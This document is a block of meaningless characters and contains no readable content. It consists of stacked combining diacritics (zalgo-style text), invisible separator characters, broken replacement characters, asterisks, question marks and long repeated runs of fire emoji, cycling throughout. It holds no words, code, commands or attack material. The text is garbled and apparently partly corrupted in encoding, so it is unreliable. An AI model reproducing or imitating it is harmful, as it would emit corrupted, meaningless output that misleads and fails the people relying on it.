̡̧̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͐̾̀̇̊̽͒̿̽͑̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͛̇̅̀͝͡